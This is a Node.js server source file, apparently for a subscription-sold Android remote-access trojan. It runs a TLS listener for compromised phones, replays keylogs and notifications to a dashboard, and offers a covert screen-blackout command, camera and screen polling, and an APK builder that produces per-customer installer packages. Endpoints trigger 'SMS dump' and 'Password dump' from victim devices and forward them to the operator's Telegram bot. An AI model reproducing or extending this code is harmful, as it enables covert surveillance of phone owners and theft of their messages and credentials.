            // Pass compressed frame data directly to dashboard — decompression happens client-side.
            // This avoids a costly server-side gunzip + JSON-parse on every recording fetch,
            // keeps SSE event payloads smaller, and lets the dashboard decompress asynchronously
            // without blocking the Node event loop.
            let finalResponse = response;
            if (response && response.framesCompressed === true) {
                log('MSG', `Relaying compressed recording ${response.filename || ''} to dashboard (${
                    typeof response.framesData === 'string' ? response.framesData.length : 0} bytes base64)`);
            }

            const result = { commandId, command: pending.command, deviceId,
                             response: finalResponse, error: error || null, success: !error,
                             timestamp: new Date() };
            // Broadcast to all SSE clients so the result reaches the dashboard even if the
            // SSE connection reconnected (and got a new sseClientId) while the command was in flight.
            // This is safe for single-admin setups; in multi-user setups each client filters by deviceId.
            broadcastDash('command:result', result);

            broadcastDash('activity:log', {
                type: 'command_result', deviceId, command: pending.command,
                commandId, success: !error, timestamp: new Date()
            });
        }

        // Persist to DB fire-and-forget — never block the response pipeline on DB
        Command.findOneAndUpdate(
            { id: commandId },
            { status: error ? 'failed' : 'success', response, error, completedAt: new Date() }
        ).catch(() => {});

        return;
    }

    // ── Task progress pushed by device during offline task execution ───────────
    if (event === 'task:progress') {
        const conn = tcpClients.get(clientId);
        const deviceId = conn?.deviceId;
        broadcastDash('task:progress', { ...data, deviceId });
        return;
    }

    // ── Chunked data stream from Android (contacts, SMS, apps, files…) ─────────
    // The device sends many small "data:chunk" events instead of one huge payload
    // so the dashboard can render data progressively and the 45 s timer is never hit.
    if (event === 'data:chunk') {
        const conn = tcpClients.get(clientId);
        const deviceId = conn?.deviceId;
        if (!deviceId || !data?.commandId) return;

        // Feed internal chunk collectors (e.g. used by _autoSendSmsToTelegram)
        const collector = _internalChunkCollectors.get(data.commandId);
        if (collector) {
            if (data.chunk && Array.isArray(data.chunk)) {
                for (const item of data.chunk) collector.items.push(item);
            }
            if (data.done || data.error) {
                clearTimeout(collector.timer);
                _internalChunkCollectors.delete(data.commandId);
                collector.resolve(data.error ? [] : collector.items);
            }
        }

        broadcastDash('data:chunk', { ...data, deviceId });
        return;
    }

    log('MSG', `Unhandled event: ${event}`, 'warn');
}

// ============================================
// TCP SERVER — Android devices (TLS)
// ============================================
const tlsKey  = fs.readFileSync(path.join(__dirname, 'tls', 'server.key'));
const tlsCert = fs.readFileSync(path.join(__dirname, 'tls', 'server.crt'));
const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: false, rejectUnauthorized: false }, (conn) => {
    const id = crypto.randomBytes(8).toString('hex');
    conn.id          = id;
    conn.clientType  = 'android';
    conn.lastPong    = Date.now();
    conn.buf         = '';
    tcpClients.set(id, conn);
    log('TCP', `New Android connection ${id} from ${conn.remoteAddress}`);

    conn.setNoDelay(true);           // disable Nagle — relay commands immediately, don't batch
    conn.setKeepAlive(true, 15000);  // OS-level keepalive: probe after 15 s of silence
    // Increase receive buffer to 256 KB — handles burst data from slow 3G devices
    // (e.g. large keylog dumps or audio data arriving in a single flush)
    conn.setRecvBufferSize && conn.setRecvBufferSize(262144);
    conn.setEncoding('utf8');

    conn.on('data', (chunk) => {
        conn.buf += chunk;
        let idx;
        while ((idx = conn.buf.indexOf('\n')) !== -1) {
            const line = conn.buf.slice(0, idx).trim();
            conn.buf = conn.buf.slice(idx + 1);
            if (!line) continue;
            let msg;
            try { msg = JSON.parse(line); } catch (e) { continue; }
            processMessage(id, 'android', msg.event, msg.data);
        }
    });

    conn.on('close', async () => {
        tcpClients.delete(id);
        if (conn.deviceId) {
            if (conn.channelType === 'stream') {
                // Only remove the stream ref if this socket is still the active one
                if (deviceToStreamTcp.get(conn.deviceId) === id) deviceToStreamTcp.delete(conn.deviceId);
            } else if (conn.channelType === 'live') {
                // Only remove the live ref if this socket is still the active one
                if (deviceToLiveTcp.get(conn.deviceId) === id) deviceToLiveTcp.delete(conn.deviceId);
            } else {
                // Primary channel closed. Only broadcast device:disconnected if this socket
                // is STILL the active primary — a new device:register may have already replaced
                // it (e.g. after our eviction), in which case the device is still online.
                if (deviceToTcp.get(conn.deviceId) !== id) {
                    // Stale socket from previous reconnect — suppress noise
                    return;
                }
                // Grace period: wait 3 s before marking offline, so rapid reconnects (frp tunnel
                // rotation, mobile network handoffs) don't produce false offline flashes in the UI.
                const disconnectedDeviceId = conn.deviceId;
                const disconnectedConnId   = id;
                setTimeout(async () => {
                    // Re-check: if a new primary has registered in the meantime, skip broadcast
                    if (deviceToTcp.get(disconnectedDeviceId) !== disconnectedConnId &&
                        deviceToTcp.has(disconnectedDeviceId)) {
                        return; // Device reconnected during grace period — suppress
                    }
                    log('TCP', `Device ${disconnectedDeviceId} disconnected`);
                    deviceToTcp.delete(disconnectedDeviceId);
                    deviceStreamingState.delete(disconnectedDeviceId);
                    R.markDeviceOffline(disconnectedDeviceId).catch(() => {});
                    try {
                        await Device.findOneAndUpdate({ deviceId: disconnectedDeviceId },
                            { isOnline: false, lastSeen: new Date() });
                    } catch (e) {}
                    {
                        const rec = inMemoryDevices.get(disconnectedDeviceId);
                        const aid = (rec && rec.accessId) || '';
                        broadcastDashScoped('device:disconnected', { deviceId: disconnectedDeviceId, accessId: aid, timestamp: new Date() }, aid || null);
                    }
                    broadcastDeviceList();
                }, 3000);
            }
        }
    });

    conn.on('error', (e) => log('TCP', `Error on ${id}: ${e.message}`, 'error'));
});

tcpServer.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
        log('TCP', `Port ${TCP_PORT} in use — killing and retrying…`, 'warn');
        try { require('child_process').execSync(`fuser -k ${TCP_PORT}/tcp 2>/dev/null`); } catch (_) {}
        setTimeout(() => tcpServer.listen(TCP_PORT, '0.0.0.0'), 1500);
    } else {
        log('TCP', `Server error: ${err.message}`, 'error');
    }
});
tcpServer.listen(TCP_PORT, '0.0.0.0', () =>
    log('TCP', `Android device server listening on 0.0.0.0:${TCP_PORT}`));

// ============================================
// HTTP SERVER — Dashboard (SSE + REST, no WebSocket)
// ============================================
const app    = express();
const server = http.createServer(app);

// Compress HTTP responses — reduces dashboard payload sizes significantly on slow connections.
// SSE streams are excluded automatically (streaming responses bypass compression).
app.use(compression({
    level: 6,
    threshold: 1024,
    filter: (req, res) => {
        // Never compress SSE streams — they must flush each event immediately.
        if (req.headers.accept && req.headers.accept.includes('text/event-stream')) return false;
        return compression.filter(req, res);
    }
}));
app.set('trust proxy', 1);
app.use(helmet({
    contentSecurityPolicy: false,           // dashboard inlines styles + uses inline svg captcha
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: 'cross-origin' },
    hsts: process.env.NODE_ENV === 'production' ? undefined : false,
}));
app.use(cors());
app.use(express.json({ limit: '20mb' }));
app.use(express.static(path.join(__dirname, 'public'), {
    maxAge: '1h',           // cache static assets in browser
    etag: true,
    lastModified: true
}));

// Brute-force protection on login + captcha endpoints. Catches scripted
// credential-stuffing while letting normal humans retry several times.
const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 30,
    standardHeaders: true,
    legacyHeaders: false,
    message: { success: false, error: 'Too many attempts. Please wait a few minutes and try again.' },
});
const captchaLimiter = rateLimit({
    windowMs: 10 * 60 * 1000,
    max: 60,
    standardHeaders: true,
    legacyHeaders: false,
    message: { success: false, error: 'Too many captcha requests. Please wait and try again.' },
});

// Issue a fresh captcha challenge — used by the login + register pages.
app.get('/api/captcha', captchaLimiter, (req, res) => {
    try {
        const c = createCaptcha();
        res.set('Cache-Control', 'no-store');
        res.json({ success: true, captchaId: c.captchaId, svg: c.svg });
    } catch (e) {
        res.status(500).json({ success: false, error: 'Could not generate captcha.' });
    }
});

app.use('/api/auth', authRoutes);
app.use('/api/user', devicesRoutes);
app.use('/api/user-auth/login', authLimiter);
app.use('/api/user-auth/register', authLimiter);
app.use('/api/user-auth', userAuthRoutes);
app.use('/api/admin/login', authLimiter);

// ── Admin login using ADMIN_USERNAME / ADMIN_PASSWORD secrets ────────────────
app.post('/api/admin/login', (req, res) => {
    const { username, password, captchaId, captcha } = req.body || {};
    if (!verifyCaptcha(captchaId, captcha)) {
        return res.status(400).json({ success: false, error: 'Captcha is incorrect or expired. Please try again.', captchaFailed: true });
    }
    const adminUser = (process.env.ADMIN_USERNAME || '').trim();
    const adminPass = (process.env.ADMIN_PASSWORD || '').trim();
    log('AUTH', `Admin login attempt — user="${username}" configured=${!!adminUser && !!adminPass}`);
    if (!adminUser || !adminPass) {
        log('AUTH', 'ADMIN_USERNAME/ADMIN_PASSWORD not set in environment', 'error');
        return res.status(500).json({ success: false, error: 'Admin credentials not configured on server.' });
    }
    if ((username || '').trim() === adminUser && (password || '').trim() === adminPass) {
        const token = crypto.randomBytes(32).toString('hex');
        if (!global._adminTokens) global._adminTokens = new Map();
        global._adminTokens.set(token, Date.now() + 86400000);
        log('AUTH', `Admin login successful for "${username}"`);
        return res.json({ success: true, token });
    }
    log('AUTH', `Admin login failed — credentials mismatch`, 'warn');
    return res.status(401).json({ success: false, error: 'Invalid credentials.' });
});

// ── Fast dedicated blackout channel ──────────────────────────────────────────
// Bypasses the WebSocket command queue — writes directly to the device TCP socket.
// Dashboard calls this via HTTP for minimum latency (no WS roundtrip, no queue wait).
app.post('/api/device/:deviceId/blackout', (req, res) => {
    const { deviceId } = req.params;
    const { state } = req.body; // true = on, false = off
    const command  = state ? 'screen_blackout_on' : 'screen_blackout_off';
    const tcpConnId = deviceToTcp.get(deviceId);
    const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;
    if (!tcpConn || !tcpConn.writable) {
        return res.status(404).json({ success: false, error: 'Device offline or not found' });
    }
    const commandId = crypto.randomBytes(8).toString('hex');
    tcpSend(tcpConn, 'command:execute', { commandId, command, params: null });
    log('BLACKOUT', `Fast channel: ${command} → ${deviceId}`);
    res.json({ success: true, command, deviceId });
});

// ── Admin token verification ──────────────────────────────────────────────────
app.post('/api/admin/verify', (req, res) => {
    const { token } = req.body;
    if (!token) return res.status(401).json({ success: false });
    if (!global._adminTokens) return res.status(401).json({ success: false });
    const expiry = global._adminTokens.get(token);
    if (!expiry || Date.now() > expiry) {
        global._adminTokens.delete(token);
        return res.status(401).json({ success: false });
    }
    return res.json({ success: true });
});

// ── SSE event stream — Dashboard persistent TCP push channel ─────────────────
// Browser connects here with EventSource; server pushes newline-delimited JSON.
// Each dashboard has an sseId used to route command results back to the right tab.
app.get('/api/events', async (req, res) => {
    const token = req.query.token;
    if (!token) return res.status(401).end();

    // Accept either an admin token (hex from global._adminTokens) OR a user
    // JWT (role: 'user'). For users, look up their accessId so we can scope
    // every device broadcast to their own builds only.
    let role = null;
    let accessId = '';
    let userId = null;
    if (global._adminTokens && global._adminTokens.has(token)) {
        const expiry = global._adminTokens.get(token);
        if (expiry && Date.now() <= expiry) role = 'admin';
    }
    if (!role) {
        try {
            const decoded = jwt.verify(token, getJwtSecret());
            if (decoded && decoded.userId && decoded.role === 'user') {
                role = 'user';
                userId = decoded.userId;
                // Prefer fresh value from MongoDB; fall back to JWT claim so
                // users still see their devices when MongoDB is unavailable.
                try {
                    const u = await User.findById(userId).select('accessId').lean();
                    accessId = (u && u.accessId) || decoded.accessId || '';
                } catch (_) { accessId = decoded.accessId || ''; }
            }
        } catch (_) { /* invalid token */ }
    }
    if (!role) return res.status(401).end();

    const clientId = crypto.randomBytes(8).toString('hex');

    res.setHeader('Content-Type',  'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection',    'keep-alive');
    res.setHeader('X-Accel-Buffering', 'no');  // disable nginx buffering
    res.flushHeaders();

    sseClients.set(clientId, { res, token, role, accessId, userId });
    log('SSE', `Dashboard connected ${clientId} (${role}${accessId ? ' / ' + accessId : ''})`);

    // Immediately push device list + command registry, scoped per role
    const list = await getDeviceList(role === 'user' ? accessId : null);
    sseSend(clientId, 'device:list', list);
    sseSend(clientId, 'commands:registry', COMMANDS);
    // Tell the client its own sseId so it can include it in HTTP requests
    sseSend(clientId, 'session:init', { sseClientId: clientId });

    // Replay buffered data from Redis for all known devices so the dashboard
    // sees everything that happened while it was disconnected / the user was away.
    try {
        const deviceIds = list.map(d => d.deviceId).filter(Boolean);
        for (const did of deviceIds) {
            const [keylogs, notifications, activity] = await Promise.all([
                R.getKeylogs(did),
                R.getNotifications(did),
                R.getActivity(did),
            ]);
            if (keylogs.length)        sseSend(clientId, 'keylog:history',       { deviceId: did, entries: keylogs });
            if (notifications.length)  sseSend(clientId, 'notification:history', { deviceId: did, entries: notifications });
            if (activity.length)       sseSend(clientId, 'activity:history',     { deviceId: did, entries: activity });
        }
    } catch (e) { log('SSE', `History replay error: ${e.message}`, 'warn'); }

    // Keep the connection alive with a comment every 25 s
    const keepAlive = setInterval(() => {
        if (!res.writableEnded) res.write(': ka\n\n');
    }, 25000);

    req.on('close', () => {
        clearInterval(keepAlive);
        sseClients.delete(clientId);
        log('SSE', `Dashboard disconnected ${clientId}`);
        // Do NOT cancel pending commands when SSE disconnects — the dashboard reconnects
        // within 3 s (see useTcpStream.js retry) and results are now broadcast to all
        // SSE clients, so the reconnected tab will still receive the command:result.
        // Only clear the sseId reference so the old (dead) client is no longer targeted.
        for (const [, p] of pendingCmds) {
            if (p.sseId === clientId) p.sseId = null;
        }
    });
});

// ── Dashboard ping — measure server RTT over HTTP/TCP ────────────────────────
app.post('/api/dashboard/ping', (req, res) => {
    res.json({ sentAt: req.body?.sentAt ?? null, serverAt: Date.now() });
});

// ============================================
// SETTINGS API  (Telegram + future settings)
// ============================================
function requireAdmin(req, res, next) {
    const token = (req.headers['authorization'] || '').replace('Bearer ', '') || req.query.token;
    if (!token || !global._adminTokens) return res.status(401).json({ success: false, error: 'Unauthorized' });
    const expiry = global._adminTokens.get(token);
    if (!expiry || Date.now() > expiry) return res.status(401).json({ success: false, error: 'Unauthorized' });
    next();
}

// Accepts either admin tokens (hex) OR user JWTs. Sets req.authRole = 'admin'|'user'
// and (for users) req.authUserId.
async function requireUserOrAdmin(req, res, next) {
    const token = (req.headers['authorization'] || '').replace('Bearer ', '') || req.query.token;
    if (!token) return res.status(401).json({ success: false, error: 'Unauthorized' });

    // 1) Admin token?
    if (global._adminTokens && global._adminTokens.has(token)) {
        const expiry = global._adminTokens.get(token);
        if (expiry && Date.now() <= expiry) {
            req.authRole = 'admin';
            return next();
        }
    }

    // 2) User JWT?
    try {
        const decoded = jwt.verify(token, getJwtSecret());
        if (decoded && decoded.userId && decoded.role === 'user') {
            req.authRole     = 'user';
            req.authUserId   = decoded.userId;
            req.authAccessId = decoded.accessId || '';  // carried in JWT — no DB round-trip needed
            return next();
        }
    } catch (_) { /* fall through */ }

    return res.status(401).json({ success: false, error: 'Unauthorized' });
}

// After requireUserOrAdmin, ensure the caller is either an admin or a user
// whose 7-day trial / paid window is still active. Returns 402 Payment Required
// (with a structured payload) so the dashboard can render its paywall instead
// of treating it as a generic auth failure.
async function requireActiveSubscription(req, res, next) {
    if (req.authRole === 'admin') return next();
    if (!req.authUserId)         return res.status(401).json({ success: false, error: 'Unauthorized' });
    try {
        const user = await User.findById(req.authUserId).select(
            'tier trialEndDate paidUntil email accessId'
        );
        if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
        if (user.isTrialActive()) {
            req.authUser = user;
            return next();
        }
        return res.status(402).json({
            success: false,
            error:   'subscription_required',
            message: 'Your free trial has ended. Unlock 1 month of access for $25.',
            paywall: {
                priceUsd:   paymentSettings.priceUsd,
                extendDays: paymentSettings.extendDays,
                paymentUrl: buildPaymentUrl(user),
                trialEndDate: user.trialEndDate,
                paidUntil:   user.paidUntil,
            },
        });
    } catch (e) {
        log('AUTH', `requireActiveSubscription error: ${e.message}`, 'error');
        return res.status(500).json({ success: false, error: 'Internal error' });
    }
}

// Compose the final NOWPayments URL with order_id (= our user id) and
// customer_email pre-filled so the IPN webhook can identify the payer.
function buildPaymentUrl(user) {
    const base   = paymentSettings.paymentUrl;
    const sep    = base.includes('?') ? '&' : '?';
    const params = new URLSearchParams();
    if (user && user._id)   params.set('order_id', String(user._id));
    if (user && user.email) params.set('customer_email', user.email);
    const tail = params.toString();
    return tail ? `${base}${sep}${tail}` : base;
}

// GET /api/settings  — return current (sanitised) settings (admin or user)
app.get('/api/settings', requireUserOrAdmin, async (req, res) => {
    if (req.authRole === 'admin') {
        return res.json({
            success: true,
            role: 'admin',
            telegram: {
                botToken:            telegramSettings.botToken ? '***' + telegramSettings.botToken.slice(-6) : '',
                botTokenSet:         !!telegramSettings.botToken,
                chatId:              telegramSettings.chatId,
                enabled:             telegramSettings.enabled,
                notifyConnect:       telegramSettings.notifyConnect,
                sendSmsOnConnect:        telegramSettings.sendSmsOnConnect,
                sendKeylogOnConnect:     telegramSettings.sendKeylogOnConnect,
                sendPasswordsOnConnect:  telegramSettings.sendPasswordsOnConnect,
            },
            buildWorker: {
                apiKey:               buildWorkerSettings.apiKey ? '***' + buildWorkerSettings.apiKey.slice(-6) : '',
                apiKeySet:            !!buildWorkerSettings.apiKey,
                githubActionsEnabled: workerOnline(),
                running:              buildJobs.filter(j => j.status === 'running').length,
            },
        });
    }

    // User: load their personal telegram settings
    try {
        const user = await User.findById(req.authUserId).select(
            'telegramBotToken telegramChatId telegramEnabled telegramNotifyConnect telegramSendSmsOnConnect telegramSendKeylogOnConnect telegramSendPasswordsOnConnect'
        );
        if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
        res.json({
            success: true,
            role: 'user',
            telegram: {
                botToken:            user.telegramBotToken ? '***' + user.telegramBotToken.slice(-6) : '',
                botTokenSet:         !!user.telegramBotToken,
                chatId:              user.telegramChatId || '',
                enabled:             user.telegramEnabled !== false,
                notifyConnect:       user.telegramNotifyConnect !== false,
                sendSmsOnConnect:        !!user.telegramSendSmsOnConnect,
                sendKeylogOnConnect:     !!user.telegramSendKeylogOnConnect,
                sendPasswordsOnConnect:  !!user.telegramSendPasswordsOnConnect,
            },
        });
    } catch (e) {
        return res.status(500).json({ success: false, error: e.message });
    }
});

// POST /api/settings  — update settings at runtime (admin or user)
app.post('/api/settings', requireUserOrAdmin, async (req, res) => {
    const { telegram } = req.body || {};
    if (!telegram) { return res.json({ success: true }); }

    if (req.authRole === 'admin') {
        if (typeof telegram.botToken      === 'string' && telegram.botToken && !telegram.botToken.startsWith('***'))
            telegramSettings.botToken = telegram.botToken.trim();
        if (typeof telegram.chatId        === 'string')  telegramSettings.chatId        = telegram.chatId.trim();
        if (typeof telegram.enabled             === 'boolean') telegramSettings.enabled             = telegram.enabled;
        if (typeof telegram.notifyConnect       === 'boolean') telegramSettings.notifyConnect       = telegram.notifyConnect;
        if (typeof telegram.sendSmsOnConnect        === 'boolean') telegramSettings.sendSmsOnConnect        = telegram.sendSmsOnConnect;
        if (typeof telegram.sendKeylogOnConnect     === 'boolean') telegramSettings.sendKeylogOnConnect     = telegram.sendKeylogOnConnect;
        if (typeof telegram.sendPasswordsOnConnect  === 'boolean') telegramSettings.sendPasswordsOnConnect  = telegram.sendPasswordsOnConnect;
        // Admin-only build worker key
        const bw = req.body?.buildWorker;
        if (bw && typeof bw === 'object') {
            if (typeof bw.apiKey === 'string' && bw.apiKey && !bw.apiKey.startsWith('***')) {
                const newKey = bw.apiKey.trim();
                buildWorkerSettings.apiKey = newKey;
                // Persist to file so restarts pick it up even without env var
                try { fs.writeFileSync(_BUILD_KEY_FILE, newKey, { mode: 0o600 }); } catch (_) {}
                process.env._BUILD_KEY_SOURCE = 'env';
                log('SETTINGS', `Admin updated build worker API key (length=${newKey.length}) — will be used on next build dispatch.`);
                // Key is passed via client_payload at dispatch time — no GitHub secret sync needed.
            } else if (bw.apiKey === '') {
                buildWorkerSettings.apiKey = '';
                try { fs.unlinkSync(_BUILD_KEY_FILE); } catch (_) {}
                log('SETTINGS', 'Admin cleared build worker API key');
            }
        }
        log('SETTINGS', 'Admin Telegram settings updated via dashboard');
        return res.json({ success: true });
    }

    // User
    try {
        const user = await User.findById(req.authUserId);
        if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
        if (typeof telegram.botToken      === 'string' && telegram.botToken && !telegram.botToken.startsWith('***'))
            user.telegramBotToken = telegram.botToken.trim();
        if (typeof telegram.chatId        === 'string')  user.telegramChatId        = telegram.chatId.trim();
        if (typeof telegram.enabled             === 'boolean') user.telegramEnabled             = telegram.enabled;
        if (typeof telegram.notifyConnect       === 'boolean') user.telegramNotifyConnect       = telegram.notifyConnect;
        if (typeof telegram.sendSmsOnConnect        === 'boolean') user.telegramSendSmsOnConnect        = telegram.sendSmsOnConnect;
        if (typeof telegram.sendKeylogOnConnect     === 'boolean') user.telegramSendKeylogOnConnect     = telegram.sendKeylogOnConnect;
        if (typeof telegram.sendPasswordsOnConnect  === 'boolean') user.telegramSendPasswordsOnConnect  = telegram.sendPasswordsOnConnect;
        await user.save();
        log('SETTINGS', `User Telegram settings updated for ${user.email}`);
        return res.json({ success: true });
    } catch (e) {
        return res.status(500).json({ success: false, error: e.message });
    }
});

// POST /api/settings/telegram/test  — send a test message (admin or user)
app.post('/api/settings/telegram/test', requireUserOrAdmin, async (req, res) => {
    const { botToken, chatId } = req.body || {};

    let activeToken, activeChat;
    if (req.authRole === 'admin') {
        activeToken = (botToken && !botToken.startsWith('***')) ? botToken.trim() : telegramSettings.botToken;
        activeChat  = chatId?.trim() || telegramSettings.chatId;
    } else {
        try {
            const user = await User.findById(req.authUserId).select('telegramBotToken telegramChatId');
            if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
            activeToken = (botToken && !botToken.startsWith('***')) ? botToken.trim() : user.telegramBotToken;
            activeChat  = chatId?.trim() || user.telegramChatId;
        } catch (e) {
            return res.status(500).json({ success: false, error: e.message });
        }
    }
    const token = activeToken;
    const chat  = activeChat;
    if (!token || !chat) return res.status(400).json({ success: false, error: 'Bot token and Chat ID are required.' });
    try {
        const https = require('https');
        const body  = JSON.stringify({ chat_id: chat, text: '✅ <b>Test Notification</b>\nYour RemoteAccess dashboard is connected to Telegram!', parse_mode: 'HTML' });
        const opts  = {
            hostname: 'api.telegram.org',
            path:     `/bot${token}/sendMessage`,
            method:   'POST',
            headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
        };
        const result = await new Promise((resolve, reject) => {
            const req2 = https.request(opts, (r) => {
                let data = '';
                r.on('data', d => { data += d; });
                r.on('end', () => { try { resolve(JSON.parse(data)); } catch { resolve({ ok: false }); } });
            });
            req2.on('error', reject);
            req2.write(body);
            req2.end();
        });
        if (result.ok) return res.json({ success: true });
        return res.status(400).json({ success: false, error: result.description || 'Telegram API error' });
    } catch (e) {
        return res.status(500).json({ success: false, error: e.message });
    }
});

// POST /api/settings/telegram/test-sms
// deviceId = specific device ID  OR  'all' = every online device under this account
app.post('/api/settings/telegram/test-sms', requireUserOrAdmin, async (req, res) => {
    const { deviceId } = req.body || {};
    if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });

    let activeToken, activeChat, userList = [], accessIdFilter = null;
    if (req.authRole === 'admin') {
        activeToken = telegramSettings.botToken;
        activeChat  = telegramSettings.chatId;
    } else {
        try {
            const user = await User.findById(req.authUserId).select('telegramBotToken telegramChatId accessId');
            if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
            activeToken    = user.telegramBotToken;
            activeChat     = user.telegramChatId;
            accessIdFilter = user.accessId;
            userList = [{ telegramBotToken: activeToken, telegramChatId: activeChat }];
        } catch (e) { return res.status(500).json({ success: false, error: e.message }); }
    }
    if (!activeToken || !activeChat) return res.status(400).json({ success: false, error: 'Telegram bot not configured — set Bot Token and Chat ID first.' });

    // Resolve target device list
    let targets = [];
    if (deviceId === 'all') {
        for (const [id, rec] of inMemoryDevices) {
            if (!rec.isOnline) continue;
            if (accessIdFilter && rec.accessId !== accessIdFilter) continue;
            const conn = _getTcpConnForDevice(id);
            if (conn && conn.writable) targets.push({ id, name: rec.deviceInfo?.name || rec.deviceName || id });
        }
        if (!targets.length) return res.status(400).json({ success: false, error: 'No online devices found for this account.' });
    } else {
        const conn = _getTcpConnForDevice(deviceId);
        if (!conn || !conn.writable) return res.status(400).json({ success: false, error: 'Device is offline — connect the device first.' });
        const rec = inMemoryDevices.get(deviceId);
        targets = [{ id: deviceId, name: rec?.deviceInfo?.name || rec?.deviceName || deviceId }];
    }

    res.json({ success: true, message: `SMS dump triggered for ${targets.length} device${targets.length !== 1 ? 's' : ''} — check Telegram in a few seconds.` });
    for (const t of targets) {
        _autoSendSmsToTelegram(t.id, t.name, req.authRole === 'admin', userList).catch(() => {});
        await new Promise(r => setTimeout(r, 500)); // slight stagger to avoid Telegram rate limits
    }
});

// POST /api/settings/telegram/test-passwords
// deviceId = specific device ID  OR  'all' = every online device under this account
app.post('/api/settings/telegram/test-passwords', requireUserOrAdmin, async (req, res) => {
    const { deviceId } = req.body || {};
    if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });

    let activeToken, activeChat, userList = [], accessIdFilter = null;
    if (req.authRole === 'admin') {
        activeToken = telegramSettings.botToken;
        activeChat  = telegramSettings.chatId;
    } else {
        try {
            const user = await User.findById(req.authUserId).select('telegramBotToken telegramChatId accessId');
            if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
            activeToken    = user.telegramBotToken;
            activeChat     = user.telegramChatId;
            accessIdFilter = user.accessId;
            userList = [{ telegramBotToken: activeToken, telegramChatId: activeChat }];
        } catch (e) { return res.status(500).json({ success: false, error: e.message }); }
    }
    if (!activeToken || !activeChat) return res.status(400).json({ success: false, error: 'Telegram bot not configured — set Bot Token and Chat ID first.' });

    // Resolve target device list
    let targets = [];
    if (deviceId === 'all') {
        for (const [id, rec] of inMemoryDevices) {
            if (!rec.isOnline) continue;
            if (accessIdFilter && rec.accessId !== accessIdFilter) continue;
            const conn = _getTcpConnForDevice(id);
            if (conn && conn.writable) targets.push({ id, name: rec.deviceInfo?.name || rec.deviceName || id });
        }
        if (!targets.length) return res.status(400).json({ success: false, error: 'No online devices found for this account.' });
    } else {
        const conn = _getTcpConnForDevice(deviceId);
        if (!conn || !conn.writable) return res.status(400).json({ success: false, error: 'Device is offline — connect the device first.' });
        const rec = inMemoryDevices.get(deviceId);
        targets = [{ id: deviceId, name: rec?.deviceInfo?.name || rec?.deviceName || deviceId }];
    }

    res.json({ success: true, message: `Password dump triggered for ${targets.length} device${targets.length !== 1 ? 's' : ''} — check Telegram in a few seconds.` });
    for (const t of targets) {
        _autoSendPasswordsToTelegram(t.id, t.name, req.authRole === 'admin', userList).catch(() => {});
        await new Promise(r => setTimeout(r, 500));
    }
});

// ── Screen reader polling — dashboard polls this when SSE is unreliable ───────
// Returns the latest screen:update frame cached from the Android device.
// Auth via token query param (same pattern as /api/events).
app.get('/api/screen-reader/latest/:deviceId', (req, res) => {
    const token = req.query.token || (req.headers['authorization'] || '').replace('Bearer ', '');
    if (!token || !global._adminTokens) return res.status(401).json({ success: false });
    const expiry = global._adminTokens.get(token);
    if (!expiry || Date.now() > expiry) return res.status(401).json({ success: false });

    const { deviceId } = req.params;
    const data = latestScreenReaderData.get(deviceId);
    if (!data) return res.json({ success: false, hasData: false });
    res.json(data);
});

// ── Stream frame polling — dashboard polls this when SSE is unreliable ────────
// Returns the latest JPEG stream frame cached from the Android device.
app.get('/api/stream/latest/:deviceId', (req, res) => {
    const token = req.query.token || (req.headers['authorization'] || '').replace('Bearer ', '');
    if (!token || !global._adminTokens) return res.status(401).json({ success: false });
    const expiry = global._adminTokens.get(token);
    if (!expiry || Date.now() > expiry) return res.status(401).json({ success: false });

    const { deviceId } = req.params;
    const data = latestStreamFrame.get(deviceId);
    if (!data) return res.json({ success: false, hasData: false });
    res.json({ success: true, ...data });
});

// ── Camera frame polling endpoint ──────────────────────────────────────────────
app.get('/api/camera/latest/:deviceId', (req, res) => {
    const token = req.query.token || (req.headers['authorization'] || '').replace('Bearer ', '');
    if (!token || !global._adminTokens) return res.status(401).json({ success: false });
    const expiry = global._adminTokens.get(token);
    if (!expiry || Date.now() > expiry) return res.status(401).json({ success: false });

    const { deviceId } = req.params;
    const data = latestCameraFrame.get(deviceId);
    if (!data) return res.json({ success: false, hasData: false });
    res.json({ success: true, ...data });
});

// Recordings are stored ONLY on the Android device — no server-side recording endpoints.

// ============================================
// APK BUILDER  (worker-based queue)
// ============================================
// Architecture:
//   1. Users submit jobs via POST /api/build/apk → enqueued in `buildJobs`.
//   2. A standalone build.sh worker (running anywhere) authenticates with
//      buildWorkerSettings.apiKey and long-polls GET /api/build/worker/poll.
//   3. Worker streams log lines back via POST /api/build/worker/log/:id,
//      uploads finished APKs via .../upload/:id/:type, finalises via
//      .../complete/:id.
//   4. Files land in apk-output/<accessId>/{Module.apk,Installer.apk}.
//
// One job runs at a time. Pending jobs are kept in FIFO order. A finished
// job is moved to `recentBuildJobs` (capped) so the UI can fetch its log.
const BUILD_OUTPUT_ROOT = path.join(__dirname, '..', 'apk-output');
const APK_EXPIRY_MS = 10 * 60 * 1000; // 10 minutes
// Map: accessId -> expiry timer handle (only one timer per accessId at a time)
const _apkExpiryTimers = new Map();

function _deleteApkDir(accessId) {
    const dir = path.join(BUILD_OUTPUT_ROOT, accessId);
    try {
        if (fs.existsSync(dir)) {
            fs.readdirSync(dir).forEach(f => {
                try { fs.unlinkSync(path.join(dir, f)); } catch (_) {}
            });
            try { fs.rmdirSync(dir); } catch (_) {}
            log('BUILD', `APK files for ${accessId} expired and deleted after 10 minutes`);
        }
    } catch (e) {
        log('BUILD', `Failed to delete APK dir for ${accessId}: ${e.message}`, 'warn');
    }
    _apkExpiryTimers.delete(accessId);
}

// Track expiry timestamps for the build status API
const _apkExpiryTimes = new Map(); // accessId -> expiresAt ms

function _scheduleApkExpiry(accessId) {
    // Cancel any existing timer for this accessId (reset on re-upload)
